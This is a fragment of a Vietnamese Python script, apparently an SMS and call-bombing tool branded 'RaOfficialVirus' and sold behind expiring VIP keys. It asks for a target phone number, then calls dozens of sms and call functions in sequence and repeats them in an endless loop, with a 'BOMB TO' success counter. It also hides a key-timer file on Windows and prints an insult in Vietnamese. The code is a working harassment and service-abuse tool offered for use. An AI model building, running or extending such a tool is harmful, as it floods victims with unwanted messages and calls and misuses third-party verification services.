            log_path = os.path.join(current_directory, code_path)
            try:
                with open(log_path, 'r'):
                    pass
            except FileNotFoundError:
                with open(log_path, 'w') as log_file:
                    current_time = datetime.date.today()
                    log_file.write(str(current_time))
            if os.name == 'nt':  # Windows
                import ctypes
                FILE_ATTRIBUTE_HIDDEN = 0x02
                ret = ctypes.windll.kernel32.SetFileAttributesW(log_path, FILE_ATTRIBUTE_HIDDEN)
            with open(log_path, 'r') as log_file:
                log_content = log_file.read()

            log_date_parts = log_content.split("-")
            current_date = datetime.date.today().strftime("%Y-%m-%d").split("-")

            if int(log_date_parts[0]) < int(current_date[0]):
                print(format_print("=.=","Key đã hết hạn vui lòng sử dụng key mới "))
                time.sleep(2)
                a=0
            elif int(log_date_parts[0]) == int(current_date[0]) and int(log_date_parts[1]) < int(current_date[1]):
                print(format_print("=.=","Key đã hết hạn vui lòng sử dụng key mới "))
                time.sleep(2)
                a=0
            elif int(log_date_parts[0]) == int(current_date[0]) and int(log_date_parts[1]) == int(current_date[1]) and int(log_date_parts[2]) <= int(current_date[2]) - ngay:
                print(format_print("=.=","Key đã hết hạn vui lòng sử dụng key mới "))
                time.sleep(2)
                a=0
            else:
                a=1
                while True:
                    print(format_print("?","Key đúng"))
                    import os
                    import requests, json
                    import uuid
                    import time, random, string
                    import time
                    os.system('cls')
                    Banner()
                    def chay():
                        global phone
                        phone=input(format_input("+","Nhập số điện thoại cần SPAM: "))
                        
                        if phone in sdt:
                            print(format_print("$","HAIZ chào con chó, mày muốn spam tao sao. OK nhưng trước hết tao sẽ spam m trước"))
                            phone='0123456789'
                        phone1='+84'+phone
                        a=1
                        while a<2:
                                sms0(phone)
                                sms1(phone)
                                sms2(phone)
                                call1(phone)
                                thantai(phone)
                                sms3(phone)
                                sms4(phone)
                                sms5(phone)
                                call2(phone)
                                denthan(phone)
                                sms7(phone)
                                sms8(phone)
                                moneyveo(phone)
                                call3(phone)
                                call(phone)
                                sms10(phone)
                                sms11(phone)
                                call4(phone)
                                pizza(phone)
                                moneyveo(phone)
                                sms14(phone)
                                call5(phone)
                                sms15(phone)
                                sms16(phone)
                                call5(phone)
                                sms19(phone)
                                sms20(phone)
                                call7(phone)
                                call8(phone)
                                sms24(phone)
                                moneyveo(phone)
                                sms25(phone)
                                sms26(phone)
                                call1(phone)
                                thantai(phone)
                                sms29(phone)
                                call2(phone)
                                denthan(phone)
                                sms0(phone)
                                sms31(phone)
                                sms32(phone)
                                call3(phone)
                                call(phone)
                                sms33(phone)
                                sms34(phone)
                                sms35(phone)
                                call4(phone)
                                pizza(phone)
                                call5(phone)
                                sms42(phone)
                                sms43(phone)
                                moneyveo(phone)
                                sms44(phone)
                                call6(phone)
                                sms48(phone)
                                call7(phone)
                                sms481(phone)
                                sms49(phone)
                                sms0(phone)
                                sms52(phone)
                                call8(phone)
                                sms53(phone)
                                moneyveo(phone)
                                sms55(phone)
                                sms56(phone)
                                call1(phone)
                                thantai(phone)
                                sms58(phone)
                                sms59(phone)
                                call2(phone)    
                                denthan(phone)        
                                sms61(phone)
                                call(phone)
                                sms1(phone)
                                pizza(phone)
                                call9(phone)
                                sms62(phone)
                                sms63(phone)
                                sms64(phone)
                                call10(phone)
                                sms65(phone)
                                sms66(phone)
                                call11(phone)
                                sms67(phone)
                                sms68(phone)
                                sms69(phone)
                                call12(phone)
                                sms70(phone)
                                sms71(phone)
                                run(phone)
                                a=2
                                
                    chay()
                    os.system('cls')
                    
                    Banner()
                    print(Fore.LIGHTBLUE_EX + "                       ╔═══════════════════════════════╗")
                    print("                       ║" + Fore.LIGHTRED_EX + "╔═════════════════════════════╗" + Fore.RESET + "╚╗")
                    print("                       ║" + Fore.LIGHTBLUE_EX + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "═════════" + Fore.RESET  + Fore.RESET + "╚╗╚╗")
                    print("                       ║" + Fore.RESET + "║")
                    print("                       ║" + Fore.RESET + "║BOMB TO : '" + Fore.LIGHTBLUE_EX + phone + Fore.RESET + "'")
                    print("                       ║" + Fore.RESET + "║SUCCESS : '" + Fore.LIGHTRED_EX + str(thanhcong) + Fore.RESET + "'")
                    print("                       ║" + Fore.RESET + "║FAIL    : '" + Fore.LIGHTYELLOW_EX + str(thatbai) + Fore.RESET + "'")
                    print("                       ║" + Fore.RESET + "║")
                    print("                       ║" + Fore.RESET + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "══════════" + Fore.RESET + "╝" + Fore.RESET + "╔╝")
                    print("                       ║" + Fore.LIGHTRED_EX + "╚═════════════════════════════╝" + "╔╝")
                    print(Fore.RESET + "                       ╚═══════════════════════════════╝")
                    tung=0
                    while tung==0:
                    
                        chay2(phone)
                        
                        os.system('cls')
                        
                        Banner()
                        print(Fore.LIGHTBLUE_EX + "                       ╔═══════════════════════════════╗")
                        print("                       ║" + Fore.LIGHTRED_EX + "╔═════════════════════════════╗" + Fore.RESET + "╚╗")
                        print("                       ║" + Fore.LIGHTBLUE_EX + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "═════════" + Fore.RESET  + Fore.RESET + "╚╗╚╗")
                        print("                       ║" + Fore.RESET + "║")
                        print("                       ║" + Fore.RESET + "║BOMB TO : '" + Fore.LIGHTBLUE_EX + phone + Fore.RESET + "'")
                        print("                       ║" + Fore.RESET + "║SUCCESS : '" + Fore.LIGHTRED_EX + str(thanhcong) + Fore.RESET + "'")
                        print("                       ║" + Fore.RESET + "║FAIL    : '" + Fore.LIGHTYELLOW_EX + str(thatbai) + Fore.RESET + "'")
                        print("                       ║" + Fore.RESET + "║")
                        print("                       ║" + Fore.RESET + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "══════════" + Fore.RESET + "╝" + Fore.RESET + "╔╝")
                        print("                       ║" + Fore.LIGHTRED_EX + "╚═════════════════════════════╝" + "╔╝")
                        print(Fore.RESET + "                       ╚═══════════════════════════════╝")

                    if a==0:
                        break
                if a==0:
                    remove_code_from_log(user_code)
                    print(format_print1("Hết thời gian sử dụng code."))
                    remove_code_from_log(user_code)
        else:
            while check_code(user_code)==False:
                code_path='.codetimeprovip'+user_code+'.txt'
                os.system('cls')
                Banner()
                user_code=input(format_input("+","ENTER CODE VIP : "))
                if check_code(user_code)==True:
                    user_code = encrypt(user_code,5)
                    current_directory = os.path.dirname(os.path.abspath(__file__))
                    log_path = os.path.join(current_directory, code_path)
                    try:
                        with open(log_path, 'r'):
                            pass
                    except FileNotFoundError:
                        with open(log_path, 'w') as log_file:
                            current_time = datetime.date.today()
                            log_file.write(str(current_time))

                    with open(log_path, 'r') as log_file:
                        log_content = log_file.read()

                    log_date_parts = log_content.split("-")
                    current_date = datetime.date.today().strftime("%Y-%m-%d").split("-")

                    if int(log_date_parts[0]) < int(current_date[0]):
                        a=0
                    elif int(log_date_parts[0]) == int(current_date[0]) and int(log_date_parts[1]) < int(current_date[1]):
                        a=0
                    elif int(log_date_parts[0]) == int(current_date[0]) and int(log_date_parts[1]) == int(current_date[1]) and int(log_date_parts[2]) <= int(current_date[2]) -7:
                        a=0
                    else:
                        a=1
                        while True:
                            print(format_print("?","Key đúng"))
                            import os
                            import requests, json
                            import uuid
                            import time, random, string
                            import time
                            os.system('cls')
                            Banner()
                            def chay():
                                global phone
                                phone=input(format_input("+","Nhập số điện thoại cần SPAM: "))
                                
                                if phone in sdt:
                                    print(format_print("$","HAIZ chào con chó, mày muốn spam tao sao. OK nhưng trước hết tao sẽ spam m trước"))
                                    phone='0123456789'
                                phone1='+84'+phone
                                a=1
                                while a<2:
                                        sms0(phone)
                                        sms1(phone)
                                        sms2(phone)
                                        call1(phone)
                                        thantai(phone)
                                        sms3(phone)
                                        sms4(phone)
                                        sms5(phone)
                                        call2(phone)
                                        denthan(phone)
                                        sms7(phone)
                                        sms8(phone)
                                        moneyveo(phone)
                                        call3(phone)
                                        call(phone)
                                        sms10(phone)
                                        sms11(phone)
                                        call4(phone)
                                        pizza(phone)
                                        moneyveo(phone)
                                        sms14(phone)
                                        call5(phone)
                                        sms15(phone)
                                        sms16(phone)
                                        call5(phone)
                                        sms19(phone)
                                        sms20(phone)
                                        call7(phone)
                                        call8(phone)
                                        sms24(phone)
                                        moneyveo(phone)
                                        sms25(phone)
                                        sms26(phone)
                                        call1(phone)
                                        thantai(phone)
                                        sms29(phone)
                                        call2(phone)
                                        denthan(phone)
                                        sms0(phone)
                                        sms31(phone)
                                        sms32(phone)
                                        call3(phone)
                                        call(phone)
                                        sms33(phone)
                                        sms34(phone)
                                        sms35(phone)
                                        call4(phone)
                                        pizza(phone)
                                        call5(phone)
                                        sms42(phone)
                                        sms43(phone)
                                        moneyveo(phone)
                                        sms44(phone)
                                        call6(phone)
                                        sms48(phone)
                                        call7(phone)
                                        sms481(phone)
                                        sms49(phone)
                                        sms0(phone)
                                        sms52(phone)
                                        call8(phone)
                                        sms53(phone)
                                        moneyveo(phone)
                                        sms55(phone)
                                        sms56(phone)
                                        call1(phone)
                                        thantai(phone)
                                        sms58(phone)
                                        sms59(phone)
                                        call2(phone)    
                                        denthan(phone)        
                                        sms61(phone)
                                        call(phone)
                                        sms1(phone)
                                        pizza(phone)
                                        call9(phone)
                                        sms62(phone)
                                        sms63(phone)
                                        sms64(phone)
                                        call10(phone)
                                        sms65(phone)
                                        sms66(phone)
                                        call11(phone)
                                        sms67(phone)
                                        sms68(phone)
                                        sms69(phone)
                                        call12(phone)
                                        sms70(phone)
                                        run(phone)
                                        a=2
                            chay()
                            os.system('cls')
                            
                            Banner()
                            print(Fore.LIGHTBLUE_EX + "                       ╔═══════════════════════════════╗")
                            print("                       ║" + Fore.LIGHTRED_EX + "╔═════════════════════════════╗" + Fore.RESET + "╚╗")
                            print("                       ║" + Fore.LIGHTBLUE_EX + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "═════════" + Fore.RESET  + Fore.RESET + "╚╗╚╗")
                            print("                       ║" + Fore.RESET + "║")
                            print("                       ║" + Fore.RESET + "║BOMB TO : '" + Fore.LIGHTBLUE_EX + phone + Fore.RESET + "'")
                            print("                       ║" + Fore.RESET + "║SUCCESS : '" + Fore.LIGHTRED_EX + str(thanhcong) + Fore.RESET + "'")
                            print("                       ║" + Fore.RESET + "║FAIL    : '" + Fore.LIGHTYELLOW_EX + str(thatbai) + Fore.RESET + "'")
                            print("                       ║" + Fore.RESET + "║")
                            print("                       ║" + Fore.RESET + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "══════════" + Fore.RESET + "╝" + Fore.RESET + "╔╝")
                            print("                       ║" + Fore.LIGHTRED_EX + "╚═════════════════════════════╝" + "╔╝")
                            print(Fore.RESET + "                       ╚═══════════════════════════════╝")
                            tung=0
                            while tung==0:
                                    chay2(phone)
                                    os.system('cls')
                                    
                                    Banner()
                                    print(Fore.LIGHTBLUE_EX + "                       ╔═══════════════════════════════╗")
                                    print("                       ║" + Fore.LIGHTRED_EX + "╔═════════════════════════════╗" + Fore.RESET + "╚╗")
                                    print("                       ║" + Fore.LIGHTBLUE_EX + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "═════════" + Fore.RESET  + Fore.RESET + "╚╗╚╗")
                                    print("                       ║" + Fore.RESET + "║")
                                    print("                       ║" + Fore.RESET + "║BOMB TO : '" + Fore.LIGHTBLUE_EX + phone + Fore.RESET + "'")
                                    print("                       ║" + Fore.RESET + "║SUCCESS : '" + Fore.LIGHTRED_EX + str(thanhcong) + Fore.RESET + "'")
                                    print("                       ║" + Fore.RESET + "║FAIL    : '" + Fore.LIGHTYELLOW_EX + str(thatbai) + Fore.RESET + "'")
                                    print("                       ║" + Fore.RESET + "║")
                                    print("                       ║" + Fore.RESET + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "══════════" + Fore.RESET + "╝" + Fore.RESET + "╔╝")
                                    print("                       ║" + Fore.LIGHTRED_EX + "╚═════════════════════════════╝" + "╔╝")
                                    print(Fore.RESET + "                       ╚═══════════════════════════════╝")
                            if a==0:
                                break
                        if a==0:
                            remove_code_from_log(user_code)
                            print("Hết thời gian sử dụng code.")
                            remove_code_from_log(user_code)
Banner()
choice=0
print(format_print1("Hãy Bấm Nút Xuống Dòng ( ENTER ) "))
print(format_print1("╔═══@root[RaOfficialVirus]"))
a=input(format_input1("╚══> "))
oklun=0
while oklun==0:
    if a=='':
        help1()
        print(format_print1("╔═══@root[RaOfficialVirus]"))
        a=input(format_input1("╚══> "))        
    elif a=='/VER':
        ver()
        print(format_print1("╔═══@root[RaOfficialVirus]"))
        a=input(format_input1("╚══> "))
    elif a=='/INFO':
        info()
        print(format_print1("╔═══@root[RaOfficialVirus]"))
        a=input(format_input1("╚══> "))
    elif a=='/CHK':
        chk()
        print(format_print1("╔═══@root[RaOfficialVirus]"))
        a=input(format_input1("╚══> "))
    elif a=='/EXIT':
        exit1()
        print(format_print1("╔═══@root[RaOfficialVirus]"))
        a=input(format_input1("╚══> "))
    elif a=='/SPAM':
        os.system('cls')
        spam()
        
